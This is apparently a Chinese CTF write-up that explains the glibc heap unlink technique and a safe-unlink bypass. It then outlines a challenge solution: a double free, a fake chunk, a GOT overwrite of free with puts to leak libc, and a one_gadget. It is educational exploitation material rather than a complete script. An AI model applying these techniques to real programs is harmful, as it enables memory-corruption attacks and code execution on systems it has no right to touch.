本题主要想考察的知识点为unlink

WP

unlink

在堆中，bins（非fast bin）是以双向链表形式存在，而我们从这个链表中获取一个chunk时，会触发链表节点的删除操作

FD = node->fd;
BK = node->bk;
FD->bk = BK;
BK->fd = FD;

如果我们想往一个地址(target_addr)写入任意值(my_value), 那么我们可以修改chunk的fd和bk分别为target_addr - 0x18, my_value，此时unlink操作就变成了

FD = node->fd; // FD = target_addr - 0x18
BK = node->bk; // BK = my_value
FD->bk = BK;   // *(target_addr - 0x18 + 0x18) = my_value
BK->fd = FD;   // *(my_value + 0x10) = target_addr - 0x18

如果没有node节点的校验，并且我们拥有(my_value + 0x10)地区的写权限的话（一般都有target_addr的写权限），我们就能实现任意地址写。
然而，现实很骨干，开发者们早就注意到了这个漏洞，并在unlink时加入了如下的校验：检查下一个节点的presize和当前节点的size是否相同，且 FD->bk == P && BK->fd == P

加入了这样一个校验机制之后，我们就不能直接达成任意地址写这个目标了。然而，道高一尺魔高一丈，前辈们想出了一种间接任意写的办法。让我们仔细看下这段校验的代码, 令FD = &P - 0x18, BK = &P - 0x10, 此时

  • FD->bk = P
    • *(FD + 0x18) = P
    • *(&P - 0x18 + 0x18) = *(&P) = P
  • BK->fd = P
    • *(BK + 0x10) = P
    • *(&P - 0x10 + 0x10) = *(&P) = P

校验通过，继续执行赋值语句

  • FD->bk = BK
    • *(&P - 0x18 + 0x18) = &P - 0x10
    • P = &P - 0x10;
  • BK->fd = FD
    • *(&P - 0x10 + 0x10) = &P - 0x18
    • P = &P - 0X18;

最终效果为P = &P - 0x18, 让我们来个图直观感受一下unlink前后的内存布局变化

很绕，但是你就记住，使用unlink手法后，你控制的指针p变成了p-0x18

通过unlink，我们成功让原本指向堆的指针指向了指针上方的一块区域。又由于题目中一般允许让用户对堆的内容重新输入，此时（第一次输入）我们只需要写入 p64(0) * 3 + p64(target_addr)，覆盖掉P的指针, 即可让P指向我们想要写入内容的地址，然后（第二次输入）写入 p64(my_value)，就能实现任意地址写。

题解

这个文件是动态加载的，题目中有三个堆 buf_small, buf_big, buf_huge，用三个变量 init_small, init_big, init_huge来标识是否被使用，在keep方法中，直接用read读取size个字符，并且没有用 \0结束读入的字符串，可能存在信息泄露。在wipe中，没有判断flag就直接free掉了buf，这里是一个double free漏洞。renew方法则是重新给三个堆赋值。

总体思路

  1. 构造fake chunk
  2. 执行unlink
  3. 泄露libc基址
  4. 执行one_gadget

这里可以结合给出的堆图理解，但是最好是直接在gdb中调试，查看heap的变化

keep(1)
wipe(1)
keep(2)
wipe(1) # double free
keep(1) # overlap

上述代码wipe1执行后，查看heap，会发现big也不见了，逐步调试就会发现，keep2执行时分配的chunk的起始位置就是keep1的位置，因此由于double free 的原因wipe1的时候，wipe了keep2的chunk，此时big 、small都指向同一个位置，再次keep1，分配出一个chunk1

unlink之前需要做一些准备，buf_huge的大小是400000字节，最初的top chunk无法满足，我们需要先alloc一次，（这次会通过mmap分配，并扩大mmap分配的内存阈值），再free掉，再alloc第二次，第二次获取的堆地址才是我们想要的buf_huge地址(和buf_small, buf_big)相邻

keep(3)
wipe(3)
keep(3)

首先，第一个keep3执行时，由于glibc全局参数mmap_threshold默认值通常是 128KB (0x20000)，这时申请的大小为0x40000于是直接调用 mmap 系统调用向内核单独申请一块内存。释放后又重新申请，Glibc 的开发者认为：“既然程序刚才申请了这么大一块内存，用完又还回来了，说明程序可能经常需要这种大内存。如果每次都用 mmap/munmap 系统调用，开销太大了。不如我把阈值调高一点，下次这种大小的内存直接在堆里切给它。”，你进入gdb逐步调试，就会发现，此时在small 和top chunk之间出现了一个0x40000大小的chunk，结构成了small-huge-top。

注意：small和big的指针都指向同一个地址，但是大小不同

现在我们需要将chunk丢进unsorted bin以便泄漏地址

这里需要解释一下动机，我们知道unlink后你控制的指针-0x18，我们这里的payload构造的逻辑：

1.设置0x21是因为设置p位，防止进一步向下拓展

2.0x20，是因为要绕过unlink的大小检查，

3.0x61a90，设置p位为0，当释放huge的时候，chunk会向下合并

再说一次，你通过heap看到的地址是chunk的起始地址，而直接调用renew是chunk+0x10的地址

现在我们的small指针指向了small-0x18，接下来我们需要泄漏libc

第一次 renew(1) (在 Step 1):

  • 目的 ：把 big_ptr 指向 free@got。
  • 后续动作 ：利用 renew(2) 向 big_ptr 指向的地址写入数据。
  • 结果 ：将 free@got 里的内容（原本是 free 的地址）覆盖为了 puts@plt。
  • 本质 ：这是为了 劫持控制流 （把 free 变成 puts）。

第二次 renew(1)

  • 目的 ：把 big_ptr 指向 puts@got。
  • 后续动作 ：利用 wipe(2) 触发函数调用。
  • 结果 ：执行 puts(big_ptr指向的内容)。
  • 本质 ：这是为了 传递参数 ，以便泄露信息。

此时的状态：

  • 函数 ：因为劫持成功，wipe(2) 实际上调用的是 puts(...)。
  • 参数 ：puts 的参数是 big_ptr 指向的地址。
  • 问题来了 ：此时 big_ptr 指向哪里？
  • 指向 puts@got 。因此会打印出puts的地址内存地址，由此我们可以进一步计算出libc地址

最后利用one_gadge修改地址
